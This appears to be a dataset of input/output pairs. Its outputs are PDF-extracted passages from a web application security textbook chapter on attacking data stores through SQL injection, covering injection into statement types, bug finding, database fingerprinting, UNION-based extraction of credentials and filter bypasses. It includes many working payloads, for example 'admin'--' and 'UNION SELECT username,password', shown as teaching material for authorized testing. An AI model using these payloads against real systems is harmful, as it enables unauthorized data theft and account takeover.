    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 294\n294 Chapter 9 n Attacking Data Stores\nTIP In some situations, an alternative way to handle the trailing quotation\nmark without using the comment symbol is to “balance the quotes.” You fi n-\nish the injected input with an item of string data that requires a trailing quote\nto encapsulate it. For example, entering the search term:\nWiley’ OR ‘a’ = ‘a\nresults in the query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR\n‘a’=’a’ and published=1\nThis is perfectly valid and achieves the same result as the 1 = 1 attack to\nreturn all books published by Wiley, regardless of whether they have been\npublished.\nThis example shows how application logic can be bypassed, allowing an access\ncontrol fl aw in which the attacker can view all books, not just books match-\ning the allowed fi lter (showing published books). However, we will describe\nshortly how SQL injection fl aws like this can be used to extract arbitrary data\nfrom different database tables and to escalate privileges within the database\nand the database server. For this reason, any SQL injection vulnerability should\nbe regarded as extremely serious, regardless of its precise context within the\napplication’s functionality.\nInjecting into Different Statement Types\nThe SQL language contains a number of verbs that may appear at the beginning\nof statements. Because it is the most commonly used verb, the majority of SQL\ninjection vulnerabilities arise within SELECT statements. Indeed, discussions\nabout SQL injection often give the impression that the vulnerability occurs only\nin connection with SELECT statements, because the examples used are all of this\ntype. However, SQL injection fl aws can exist within any type of statement. You\nneed to be aware of some important considerations in relation to each.\nOf course, when you are interacting with a remote application, it usually is\nnot possible to know in advance what type of statement a given item of user\ninput will be processed by. However, you can usually make an educated guess\nbased on the type of application function you are dealing with. The most com-\nmon types of SQL statements and their uses are described here.\nSELECT Statements\nSELECT statements are used to retrieve information from the database. They are\nfrequently employed in functions where the application returns information in\nresponse to user actions, such as browsing a product catalog, viewing a user’s\ncc0099..iinndddd 229944 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 295\nChapter 9 n Attacking Data Stores 295\nprofi le, or performing a search. They are also often used in login functions where\nuser-supplied information is checked against data retrieved from a database.\nAs in the previous examples, the entry point for SQL injection attacks normally\nis the query’s WHERE clause. User-supplied items are passed to the database to\ncontrol the scope of the query’s results. Because the WHERE clause is usually the\nfi nal component of a SELECT statement, this enables the attacker to use the com-\nment symbol to truncate the query to the end of his input without invalidating\nthe syntax of the overall query.\nOccasionally, SQL injection vulnerabilities occur that affect other parts of the\nSELECT query, such as the ORDER BY clause or the names of tables and columns.\nTRY IT!\nhttp://mdsec.net/addressbook/32/\nINSERT Statements\nINSERT statements are used to create a new row of data within a table. They are\ncommonly used when an application adds a new entry to an audit log, creates\na new user account, or generates a new order.\nFor example, an application may allow users to self-register, specifying their\nown username and password, and may then insert the details into the users\ntable with the following statement:\nINSERT INTO users (username, password, ID, privs) VALUES (‘daf’,\n‘secret’, 2248, 1)\nIf the username or password fi eld is vulnerable to SQL injection, an attacker can\ninsert arbitrary data into the table, including his own values for ID and privs.\nHowever, to do so he must ensure that the remainder of the VALUES clause is\ncompleted gracefully. In particular, it must contain the correct number of data\nitems of the correct types. For example, injecting into the username fi eld, the\nattacker can supply the following:\nfoo’, ‘bar’, 9999, 0)--\nThis creates an account with an ID of 9999 and privs of 0. Assuming that the\nprivs fi eld is used to determine account privileges, this may enable the attacker\nto create an administrative user.\nIn some situations, when working completely blind, injecting into an INSERT\nstatement may enable an attacker to extract string data from the application. For\nexample, the attacker could grab the version string of the database and insert\nthis into a fi eld within his own user profi le, which can be displayed back to his\nbrowser in the normal way.\ncc0099..iinndddd 229955 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 296\n296 Chapter 9 n Attacking Data Stores\nTIP When attempting to inject into an INSERT statement, you may not know\nin advance how many parameters are required, or what their types are. In the\npreceding situation, you can keep adding fi elds to the VALUES clause until the\ndesired user account is actually created. For example, when injecting into the\nusername fi eld, you could submit the following:\nfoo’)--\nfoo’, 1)--\nfoo’, 1, 1)--\nfoo’, 1, 1, 1)--\nBecause most databases implicitly cast an integer to a string, an integer\nvalue can be used at each position. In this case the result is an account with\na username of foo and a password of 1, regardless of which order the other\nfi elds are in.\nIf you fi nd that the value 1 is still rejected, you can try the value 2000,\nwhich many databases also implicitly cast to date-based data types.\nWhen you have determined the correct number of fi elds following the injec-\ntion point, on MS-SQL you can add a second arbitrary query and use one of\nthe inference-based techniques described later in this chapter.\nIn Oracle, a subselect query can be issued within an insert query. This\nsubselect query can cause a success or failure of the main query, using the\ninference-based techniques described later.\nTRY IT!\nhttp://mdsec.net/addressbook/12/\nUPDATE Statements\nUPDATE statements are used to modify one or more existing rows of data within\na table. They are often used in functions where a user changes the value of data\nthat already exists — for example, updating her contact information, changing\nher password, or changing the quantity on a line of an order.\nA typical UPDATE statement works much like an INSERT statement, except that\nit usually contains a WHERE clause to tell the database which rows of the table to\nupdate. For example, when a user changes her password, the application might\nperform the following query:\nUPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password\n= ‘secret’\nThis query in effect verifi es whether the user’s existing password is correct\nand, if so, updates it with the new value. If the function is vulnerable to SQL\ncc0099..iinndddd 229966 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 297\nChapter 9 n Attacking Data Stores 297\ninjection, an attacker can bypass the existing password check and update the\npassword of the admin user by entering the following username:\nadmin’--\nNOTE Probing for SQL injection vulnerabilities in a remote application\nis always potentially dangerous, because you have no way of knowing in\nadvance quite what action the application will perform using your crafted\ninput. In particular, modifying the WHERE clause in an UPDATE statement can\ncause changes to be made throughout a critical table of the database. For\nexample, if the attack just described had instead supplied the username:\nadmin’ or 1=1--\nthis would cause the application to execute the query:\nUPDATE users SET password=’newsecret’ WHERE user = ‘admin’ or\n1=1\nThis resets the value of every user’s password, because 1 always equals 1!\nBe aware that this risk exists even when you attack an application func-\ntion that does not appear to update any existing data, such as the main login.\nThere have been cases where, following a successful login, the application\nperforms various UPDATE queries using the supplied username. This means\nthat any attack on the WHERE clause may be replicated in these other state-\nments, potentially wreaking havoc within the profi les of all application users.\nYou should ensure that the application owner accepts these unavoidable risks\nbefore attempting to probe for or exploit any SQL injection fl aws. You should\nalso strongly encourage the owner to perform a full database backup before\nyou begin testing.\nTRY IT!\nhttp://mdsec.net/addressbook/27/\nDELETE Statements\nDELETE statements are used to delete one or more rows of data within a table,\nsuch as when users remove an item from their shopping basket or delete a\ndelivery address from their personal details.\nAs with UPDATE statements, a WHERE clause normally is used to tell the data-\nbase which rows of the table to update. User-supplied data is most likely to be\nincorporated into this clause. Subverting the intended WHERE clause can have\ncc0099..iinndddd 229977 88//1199//22001111 1122::0099::3300 PPMM"
  },
  {
    "input": "Finding SQL Injection Bugs",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 298\n298 Chapter 9 n Attacking Data Stores\nfar-reaching effects, so the same caution described for UPDATE statements applies\nto this attack.\nFinding SQL Injection Bugs\nIn the most obvious cases, a SQL injection fl aw may be discovered and conclu-\nsively verifi ed by supplying a single item of unexpected input to the application.\nIn other cases, bugs may be extremely subtle and may be diffi cult to distinguish\nfrom other categories of vulnerability or from benign anomalies that do not\npresent a security threat. Nevertheless, you can carry out various steps in an\nordered way to reliably verify the majority of SQL injection fl aws.\nNOTE In your application mapping exercises (see Chapter 4), you should have\nidentifi ed instances where the application appears to be accessing a back-end\ndatabase. All of these need to be probed for SQL injection fl aws. In fact, abso-\nlutely any item of data submitted to the server may be passed to database\nfunctions in ways that are not evident from the user’s perspective and may be\nhandled in an unsafe manner. Therefore, you need to probe every such item\nfor SQL injection vulnerabilities. This includes all URL parameters, cookies,\nitems of POST data, and HTTP headers. In all cases, a vulnerability may exist in\nthe handling of both the name and value of the relevant parameter.\nTIP When you are probing for SQL injection vulnerabilities, be sure to walk\nthrough to completion any multistage processes in which you submit crafted\ninput. Applications frequently gather a collection of data across several\nrequests, and they persist this to the database only after the complete set has\nbeen gathered. In this situation, you will miss many SQL injection vulnerabili-\nties if you only submit crafted data within each individual request and monitor\nthe application’s response to that request.\nInjecting into String Data\nWhen user-supplied string data is incorporated into a SQL query, it is encap-\nsulated within single quotation marks. To exploit any SQL injection fl aw, you\nneed to break out of these quotation marks.\nHACK STEPS\n1. Submit a single quotation mark as the item of data you are targeting.\nObserve whether an error occurs, or whether the result differs from the\noriginal in any other way. If a detailed database error message is received,\nconsult the “SQL Syntax and Error Reference” section of this chapter to\nunderstand its meaning.\ncc0099..iinndddd 229988 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 299\nChapter 9 n Attacking Data Stores 299\n2. If an error or other divergent behavior was observed, submit two single\nquotation marks together. Databases use two single quotation marks as\nan escape sequence to represent a literal single quote, so the sequence is\ninterpreted as data within the quoted string rather than the closing string\nterminator. If this input causes the error or anomalous behavior to disap-\npear, the application is probably vulnerable to SQL injection.\n3. As a further verification that a bug is present, you can use SQL concat-\nenator characters to construct a string that is equivalent to some benign\ninput. If the application handles your crafted input in the same way as it\ndoes the corresponding benign input, it is likely to be vulnerable. Each\ntype of database uses different methods for string concatenation. The\nfollowing examples can be injected to construct input that is equivalent to\nFOO in a vulnerable application:\nn Oracle: ‘||’FOO\nn MS-SQL: ‘+’FOO\nn MySQL: ‘ ‘FOO (note the space between the two quotes)\nTIP One way of confi rming that the application is interacting with a back-\nend database is to submit the SQL wildcard character % in a given parameter.\nFor example, submitting this in a search fi eld often returns a large number of\nresults, indicating that the input is being passed into a SQL query. Of course,\nthis does not necessarily indicate that the application is vulnerable — only that\nyou should probe further to identify any actual fl aws.\nTIP While looking for SQL injection using a single quote, keep an eye\nout for any JavaScript errors occurring when your browser processes the\nreturned page. It is fairly common for user-supplied input to be returned\nwithin JavaScript, and an unsanitized single quote will cause an error in the\nJavaScript interpreter, just as it does in the SQL interpreter. The ability to\ninject arbitrary JavaScript into responses allows cross-site scripting attacks, as\ndescribed in Chapter 12.\nInjecting into Numeric Data\nWhen user-supplied numeric data is incorporated into a SQL query, the applica-\ntion may still handle this as string data by encapsulating it within single quotation\nmarks. Therefore, you should always follow the steps described previously for string\ndata. In most cases, however, numeric data is passed directly to the database in\nnumeric form and therefore is not placed within single quotation marks. If none\nof the previous tests points toward the presence of a vulnerability, you can take\nsome other specifi c steps in relation to numeric data.\ncc0099..iinndddd 229999 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 300\n300 Chapter 9 n Attacking Data Stores\nHACK STEPS\n1. Try supplying a simple mathematical expression that is equivalent to the\noriginal numeric value. For example, if the original value is 2, try submit-\nting 1+1 or 3-1. If the application responds in the same way, it may be\nvulnerable.\n2. The preceding test is most reliable in cases where you have confirmed\nthat the item being modified has a noticeable effect on the applica-\ntion’s behavior. For example, if the application uses a numeric PageID\nparameter to specify which content should be returned, substituting 1+1\nfor 2 with equivalent results is a good sign that SQL injection is present.\nHowever, if you can place arbitrary input into a numeric parameter with-\nout changing the application’s behavior, the preceding test provides no\nevidence of a vulnerability.\n3. If the first test is successful, you can obtain further evidence of the vulnera-\nbility by using more complicated expressions that use SQL-specific keywords\nand syntax. A good example of this is the ASCII command, which returns\nthe numeric ASCII code of the supplied character. For example, because the\nASCII value of A is 65, the following expression is equivalent to 2 in SQL:\n67-ASCII(‘A’)\n4. The preceding test will not work if single quotes are being filtered.\nHowever, in this situation you can exploit the fact that databases implic-\nitly convert numeric data to string data where required. Hence, because\nthe ASCII value of the character 1 is 49, the following expression is equiv-\nalent to 2 in SQL:\n51-ASCII(1)\nTIP A common mistake when probing an application for defects such as SQL\ninjection is to forget that certain characters have special meaning within HTTP\nrequests. If you want to include these characters within your attack payloads,\nyou must be careful to URL-encode them to ensure that they are interpreted in\nthe way you intend. In particular:\nn & and = are used to join name/value pairs to create the query string and\nthe block of POST data. You should encode them using %26 and %3d,\nrespectively.\nn Literal spaces are not allowed in the query string. If they are submitted,\nthey will effectively terminate the entire string. You should encode them\nusing+ or %20.\nn Because+ is used to encode spaces, if you want to include an actual +\nin your string, you must encode it using %2b. In the previous numeric\nexample, therefore, 1+1 should be submitted as 1%2b1.\ncc0099..iinndddd 330000 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 301\nChapter 9 n Attacking Data Stores 301\nn The semicolon is used to separate cookie fi elds and should be encoded\nusing%3b.\nThese encodings are necessary whether you are editing the parameter’s\nvalue directly from your browser, with an intercepting proxy, or through any\nother means. If you fail to encode problem characters correctly, you may inval-\nidate the entire request or submit data you did not intend to.\nThe steps just described generally are suffi cient to identify the majority\nof SQL injection vulnerabilities, including many of those where no useful results or\nerror information are transmitted back to the browser. In some cases, however,\nmore advanced techniques may be necessary, such as the use of time delays\nto confi rm the presence of a vulnerability. We will describe these techniques\nlater in this chapter.\nInjecting into the Query Structure\nIf user-supplied data is being inserted into the structure of the SQL query itself,\nrather than an item of data within the query, exploiting SQL injection simply\ninvolves directly supplying valid SQL syntax. No “escaping” is required to\nbreak out of any data context.\nThe most common injection point within the SQL query structure is within an\nORDER BY clause. The ORDER BY keyword takes a column name or number and\norders the result set according to the values in that column. This functionality\nis frequently exposed to the user to allow sorting of a table within the browser.\nA typical example is a sortable table of books that is retrieved using this query:\nSELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY\ntitle ASC\nIf the column name title in the ORDER BY is specifi ed by the user, it is not\nnecessary to use a single quote. The user-supplied data already directly modi-\nfi es the structure of the SQL query.\nTIP In some rarer cases, user-supplied input may specify a column name\nwithin a WHERE clause. Because these are also not encapsulated in single\nquotes, a similar issue occurs. The authors have also encountered applications\nwhere the table name has been a user-supplied parameter. Finally, a surpris-\ning number of applications expose the sort order keyword (ASC or DESC) to be\nspecifi ed by the user, perhaps believing that this has no consequence for SQL\ninjection attacks.\nFinding SQL injection in a column name can be diffi cult. If a value is sup-\nplied that is not a valid column name, the query results in an error. This means\nthat the response will be the same regardless of whether the attacker submits a\ncc0099..iinndddd 330011 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 302\n302 Chapter 9 n Attacking Data Stores\npath traversal string, single quote, double quote, or any other arbitrary string.\nTherefore, common techniques for both automated fuzzing and manual testing\nare liable to overlook the vulnerability. The standard test strings for numerous\nkinds of vulnerabilities will all cause the same response, which may not itself\ndisclose the nature of the error.\nNOTE Some conventional SQL injection defenses described later in this\nchapter cannot be implemented for user-specifi ed column names. Using\nprepared statements or escaping single quotes will not prevent this type of\nSQL injection. As a result, this vector is a key one to look out for in modern\napplications.\nHACK STEPS\n1. Make a note of any parameters that appear to control the order or field\ntypes within the results that the application returns.\n2. Make a series of requests supplying a numeric value in the parameter\nvalue, starting with the number 1 and incrementing it with each subse-\nquent request:\nn If changing the number in the input affects the ordering of the results,\nthe input is probably being inserted into an ORDER BY clause. In SQL,\nORDER BY 1 orders by the fi rst column. Increasing this number to 2\nshould then change the display order of data to order by the second\ncolumn. If the number supplied is greater than the number of columns\nin the result set, the query should fail. In this situation, you can confi rm\nthat further SQL can be injected by checking whether the results order\ncan be reversed, using the following:\n1 ASC --\n1 DESC --\nn If supplying the number 1 causes a set of results with a column contain-\ning a 1 in every row, the input is probably being inserted into the name\nof a column being returned by the query. For example:\nSELECT 1,title,year FROM books WHERE publisher=’Wiley’\nNOTE Exploiting SQL injection in an ORDER BY clause is signifi cantly differ-\nent from most other cases. A database will not accept a UNION,WHERE,OR, or\nAND keyword at this point in the query. Generally exploitation requires the\nattacker to specify a nested query in place of the parameter, such as replac-\ning the column name with (select 1 where <<condition>> or 1/0=0),\nthereby leveraging the inference techniques described later in this chapter.\nFor databases that support batched queries such as MS-SQL, this can be the\nmost effi cient option.\ncc0099..iinndddd 330022 88//1199//22001111 1122::0099::3300 PPMM"
  },
  {
    "input": "Fingerprinting the Database",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 303\nChapter 9 n Attacking Data Stores 303\nFingerprinting the Database\nMost of the techniques described so far are effective against all the common\ndatabase platforms, and any divergences have been accommodated through\nminor adjustments to syntax. However, as we begin to look at more advanced\nexploitation techniques, the differences between platforms become more signifi -\ncant, and you will increasingly need to know which type of back-end database\nyou are dealing with.\nYou have already seen how you can extract the version string of the major\ndatabase types. Even if this cannot be done for some reason, it is usually pos-\nsible to fi ngerprint the database using other methods. One of the most reliable\nis the different means by which databases concatenate strings. In a query where\nyou control some item of string data, you can supply a particular value in one\nrequest and then test different methods of concatenation to produce that string.\nWhen the same results are obtained, you have probably identifi ed the type of\ndatabase being used. The following examples show how the string services\ncould be constructed on the common types of database:\nn Oracle:‘serv’||’ices’\nn MS-SQL:‘serv’+’ices’\nn MySQL:‘serv’ ‘ices’ (note the space)\nIf you are injecting into numeric data, the following attack strings can be\nused to fi ngerprint the database. Each of these items evaluates to 0 on the target\ndatabase and generates an error on the other databases:\nn Oracle:BITAND(1,1)-BITAND(1,1)\nn MS-SQL:@@PACK_RECEIVED-@@PACK_RECEIVED\nn MySQL:CONNECTION_ID()-CONNECTION_ID()\nNOTE The MS-SQL and Sybase databases share a common origin, so they\nhave many similarities in relation to table structure, global variables, and stored\nprocedures. In practice, the majority of the attack techniques against MS-SQL\ndescribed in later sections will work in an identical way against Sybase.\nA further point of interest when fi ngerprinting databases is how MySQL\nhandles certain types of inline comments. If a comment begins with an exclama-\ntion point followed by a database version string, the contents of the comment\nare interpreted as actual SQL, provided that the version of the actual database\nis equal to or later than that string. Otherwise, the contents are ignored and\ntreated as a comment. Programmers can use this facility much like preproces-\nsor directives in C, enabling them to write different code that will be processed\ncc0099..iinndddd 330033 88//1199//22001111 1122::0099::3300 PPMM"
  },
  {
    "input": "The UNION Operator",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 304\n304 Chapter 9 n Attacking Data Stores\nconditionally upon the database version being used. An attacker also can use this\nfacility to fi ngerprint the exact version of the database. For example, injecting\nthe following string causes the WHERE clause of a SELECT statement to be false if\nthe MySQL version in use is greater than or equal to 3.23.02:\n/*!32302 and 1=0*/\nThe UNION Operator\nThe UNION operator is used in SQL to combine the results of two or more SELECT\nstatements into a single result set. When a web application contains a SQL injec-\ntion vulnerability that occurs in a SELECT statement, you can often employ the\nUNION operator to perform a second, entirely separate query, and combine its\nresults with those of the fi rst. If the results of the query are returned to your\nbrowser, this technique can be used to easily extract arbitrary data from within\nthe database. UNION is supported by all major DBMS products. It is the quickest\nway to retrieve arbitrary information from the database in situations where\nquery results are returned directly.\nRecall the application that enabled users to search for books based on author,\ntitle, publisher, and other criteria. Searching for books published by Wiley causes\nthe application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nSuppose that this query returns the following set of results:\nAUTHOR TITLE YEAR\nLitchfi eld The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nYou saw earlier how an attacker could supply crafted input to the search\nfunction to subvert the query’s WHERE clause and therefore return all the books\nheld within the database. A far more interesting attack would be to use the\nUNION operator to inject a second SELECT query and append its results to those\nof the fi rst. This second query can extract data from a different database table.\nFor example, entering the search term:\nWiley’ UNION SELECT username,password,uid FROM users--\ncauses the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nUNION SELECT username,password,uid FROM users--’\ncc0099..iinndddd 330044 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 305\nChapter 9 n Attacking Data Stores 305\nThis returns the results of the original search followed by the contents of\nthe users table:\nAUTHOR TITLE YEAR\nLitchfi eld The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nadmin r00tr0x 0\ncliff Reboot 1\nNOTE When the results of two or more SELECT queries are combined using\nthe UNION operator, the column names of the combined result set are the\nsame as those returned by the fi rst SELECT query. As shown in the preceding\ntable, usernames appear in the author column, and passwords appear in the\ntitle column. This means that when the application processes the results\nof the modifi ed query, it has no way of detecting that the data returned has\noriginated from a different table.\nThis simple example demonstrates the potentially huge power of the UNION\noperator when employed in a SQL injection attack. However, before it can be\nexploited in this way, two important provisos need to be considered:\nn When the results of two queries are combined using the UNION operator,\nthe two result sets must have the same structure. In other words, they must\ncontain the same number of columns, which have the same or compatible\ndata types, appearing in the same order.\nn To inject a second query that will return interesting results, the attacker\nneeds to know the name of the database table that he wants to target, and\nthe names of its relevant columns.\nLet’s look a little deeper at the fi rst of these provisos. Suppose that the attacker\nattempts to inject a second query that returns an incorrect number of columns.\nHe supplies this input:\nWiley’ UNION SELECT username,password FROM users--\nThe original query returns three columns, and the injected query returns\nonly two columns. Hence, the database returns the following error:\nORA-01789: query block has incorrect number of result columns\nSuppose instead that the attacker attempts to inject a second query whose\ncolumns have incompatible data types. He supplies this input:\nWiley’ UNION SELECT uid,username,password FROM users--\ncc0099..iinndddd 330055 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 306\n306 Chapter 9 n Attacking Data Stores\nThis causes the database to attempt to combine the password column from the\nsecond query (which contains string data) with the year column from the fi rst\nquery (which contains numeric data). Because string data cannot be converted\ninto numeric data, this causes an error:\nORA-01790: expression must have same datatype as corresponding expression\nNOTE The error messages shown here are for Oracle. The equivalent\nmessages for other databases are listed in the later section “SQL Syntax and\nError Reference.”\nIn many real-world cases, the database error messages shown are trapped\nby the application and are not be returned to the user’s browser. It may appear,\ntherefore, that in attempting to discover the structure of the fi rst query, you are\nrestricted to pure guesswork. However, this is not the case. Three important\npoints mean that your task usually is easy:\nn For the injected query to be capable of being combined with the fi rst, it is\nnot strictly necessary that it contain the same data types. Rather, they must\nbe compatible. In other words, each data type in the second query must\neither be identical to the corresponding type in the fi rst or be implicitly\nconvertible to it. You have already seen that databases implicitly convert\na numeric value to a string value. In fact, the value NULL can be converted\nto any data type. Hence, if you do not know the data type of a particular\nfi eld, you can simply SELECT NULL for that fi eld.\nn In cases where the application traps database error messages, you can\neasily determine whether your injected query was executed. If it was,\nadditional results are added to those returned by the application from its\noriginal query. This enables you to work systematically until you discover\nthe structure of the query you need to inject.\nn In most cases, you can achieve your objectives simply by identifying a\nsingle fi eld within the original query that has a string data type. This is\nsuffi cient for you to inject arbitrary queries that return string-based data\nand retrieve the results, enabling you to systematically extract any desired\ndata from the database.\nHACK STEPS\nYour fi rst task is to discover the number of columns returned by the original\nquery being executed by the application. You can do this in two ways:\n1. You can exploit the fact that NULL can be converted to any data type to\nsystematically inject queries with different numbers of columns until your\ninjected query is executed. For example:\ncc0099..iinndddd 330066 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 307\nChapter 9 n Attacking Data Stores 307\n‘ UNION SELECT NULL--\n‘ UNION SELECT NULL, NULL--\n‘ UNION SELECT NULL, NULL, NULL--\nWhen your query is executed, you have determined the number of col-\numns required. If the application doesn’t return database error messages,\nyou can still tell when your injected query was successful. An additional\nrow of data will be returned, containing either the word NULL or an empty\nstring. Note that the injected row may contain only empty table cells and so\nmay be hard to see when rendered as HTML. For this reason it is preferable\nto look at the raw response when performing this attack.\n2. Having identified the required number of columns, your next task is to\ndiscover a column that has a string data type so that you can use this to\nextract arbitrary data from the database. You can do this by injecting a\nquery containing NULLs, as you did previously, and systematically replac-\ning each NULL with a. For example, if you know that the query must return\nthree columns, you can inject the following:\n‘ UNION SELECT ‘a’, NULL, NULL--\n‘ UNION SELECT NULL, ‘a’, NULL--\n‘ UNION SELECT NULL, NULL, ‘a’--\nWhen your query is executed, you see an additional row of data containing the\nvaluea. You can then use the relevant column to extract data from the database.\nNOTE In Oracle databases, every SELECT statement must include a FROM\nattribute, so injecting UNION SELECT NULL produces an error regardless of\nthe number of columns. You can satisfy this requirement by selecting from the\nglobally accessible table DUAL. For example:\n‘ UNION SELECT NULL FROM DUAL--\nWhen you have identifi ed the number of columns required in your injected\nquery, and have found a column that has a string data type, you are in a position\nto extract arbitrary data. A simple proof-of-concept test is to extract the version\nstring of the database, which can be done on any DBMS. For example, if there\nare three columns, and the fi rst column can take string data, you can extract\nthe database version by injecting the following query on MS-SQL and MySQL:\n‘ UNION SELECT @@version,NULL,NULL--\nInjecting the following query achieves the same result on Oracle:\n‘ UNION SELECT banner,NULL,NULL FROM v$version--\nIn the example of the vulnerable book search application, we can use this\nstring as a search term to retrieve the version of the Oracle database:\ncc0099..iinndddd 330077 88//1199//22001111 1122::0099::3311 PPMM"
  },
  {
    "input": "Extracting Data with UNION",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 308\n308 Chapter 9 n Attacking Data Stores\nAUTHOR TITLE YEAR\nCORE 9.2.0.1.0 Production\nNLSRTL Version 9.2.0.1.0 - Production\nOracle9i Enterprise Edition Release 9.2.0.1.0 - Production\nPL/SQL Release 9.2.0.1.0 - Production\nTNS for 32-bit Windows: Version 9.2.0.1.0 - Production\nOf course, even though the database’s version string may be interesting, and\nmay enable you to research vulnerabilities with the specifi c software being used,\nin most cases you will be more interested in extracting actual data from the\ndatabase. To do this, you typically need to address the second proviso described\nearlier. That is, you need to know the name of the database table you want to\ntarget and the names of its relevant columns.\nExtracting Useful Data\nTo extract useful data from the database, normally you need to know the names\nof the tables and columns containing the data you want to access. The main\nenterprise DBMSs contain a rich amount of database metadata that you can\nquery to discover the names of every table and column within the database.\nThe methodology for extracting useful data is the same in each case; however,\nthe details differ on different database platforms.\nExtracting Data with UNION\nLet’s look at an attack being performed against an MS-SQL database, but use a\nmethodology that will work on all database technologies. Consider an address\nbook application that allows users to maintain a list of contacts and query and\nupdate their details. When a user searches her address book for a contact named\nMatthew, her browser posts the following parameter:\nName=Matthew\nand the application returns the following results:\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\ncc0099..iinndddd 330088 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 309\nChapter 9 n Attacking Data Stores 309\nTRY IT!\nhttp://mdsec.net/addressbook/32/\nFirst, we need to determine the required number of columns. Testing for a\nsingle column results in an error message:\nName=Matthew’%20union%20select%20null--\nAll queries combined using a UNION, INTERSECT or EXCEPT operator must\nhave an equal number of expressions in their target lists.\nWe add a second NULL, and the same error occurs. So we continue adding NULLs\nuntil our query is executed, generating an additional item in the results table:\nName=Matthew’%20union%20select%20null,null,null,null,null--\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\n[empty] [empty]\nWe now verify that the fi rst column in the query contains string data:\nName=Matthew’%20union%20select%20’a’,null,null,null,null--\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\na\nThe next step is to fi nd out the names of the database tables and columns that\nmay contain interesting information. We can do this by querying the metadata\ntable information_schema.columns, which contains details of all tables and\ncolumn names within the database. These can be retrieved with this query:\nName=Matthew’%20union%20select%20table_name,column_name,null,null,\nnull%20from%20information_schema.columns--\ncc0099..iinndddd 330099 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 310\n310 Chapter 9 n Attacking Data Stores\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\nshop_items price\nshop_items prodid\nshop_items prodname\naddr_book contactemail\naddr_book contactname\nusers username\nusers password\nHere, the users table is an obvious place to begin extracting data. We could\nextract data from the users table using this query:\nName=Matthew’%20UNION%20select%20username,password,null,null,null%20\nfrom%20users--\nNAME E-MAIL\nMatthew Adamson handytrick@gmail.com\nadministrator fme69\ndev uber\nmarcus 8pinto\nsmith twosixty\njlo 6kdown\nTIP The information_schema is supported by MS-SQL, MySQL, and many\nother databases, including SQLite and Postgresql. It is designed to hold data-\nbase metadata, making it a primary target for attackers wanting to examine\nthe database. Note that Oracle doesn’t support this schema. When targeting\nan Oracle database, the attack would be identical in every other way. However,\nyou would use the query SELECT table_name,column_name FROM all_tab_\ncolumns to retrieve information about tables and columns in the database.\n(You would use the user_tab_columns table to focus on the current database\nonly.) When analyzing large databases for points of attack, it is usually best to\nlook directly for interesting column names rather than tables. For instance:\nSELECT table_name,column_name FROM information_schema.columns where\ncolumn_name LIKE ‘%PASS%’\ncc0099..iinndddd 331100 88//1199//22001111 1122::0099::3311 PPMM"
  },
  {
    "input": "Bypassing Filters",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 311\nChapter 9 n Attacking Data Stores 311\nTIP When multiple columns are returned from a target table, these can be\nconcatenated into a single column. This makes retrieval more straightforward,\nbecause it requires identifi cation of only a single varchar fi eld in the original\nquery:\nn Oracle:SELECT table_name||’:’||column_name FROM\nall_tab_columns\nn MS-SQL:SELECT table_name+’:’+column_name from information_\nschema.columns\nn MySQL:SELECT CONCAT(table_name,’:’,column_name) from\ninformation_schema.columns\nBypassing Filters\nIn some situations, an application that is vulnerable to SQL injection may imple-\nment various input fi lters that prevent you from exploiting the fl aw without\nrestrictions. For example, the application may remove or sanitize certain characters\nor may block common SQL keywords. Filters of this kind are often vulnerable\nto bypasses, so you should try numerous tricks in this situation.\nAvoiding Blocked Characters\nIf the application removes or encodes some characters that are often used in\nSQL injection attacks, you may still be able to perform an attack without these:\nn The single quotation mark is not required if you are injecting into a numeric\ndata fi eld or column name. If you need to introduce a string into your\nattack payload, you can do this without needing quotes. You can use\nvarious string functions to dynamically construct a string using the ASCII\ncodes for individual characters. For example, the following two queries\nfor Oracle and MS-SQL, respectively, are the equivalent of select ename,\nsal from emp where ename=’marcus’:\nSELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||\nCHR(114)||CHR(99)||CHR(117)||CHR(115)\nSELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)\n+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)\nn If the comment symbol is blocked, you can often craft your injected data\nsuch that it does not break the syntax of the surrounding query, even\nwithout using this. For example, instead of injecting:\n‘ or 1=1--\nyou can inject:\n‘ or ‘a’=’a\ncc0099..iinndddd 331111 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 312\n312 Chapter 9 n Attacking Data 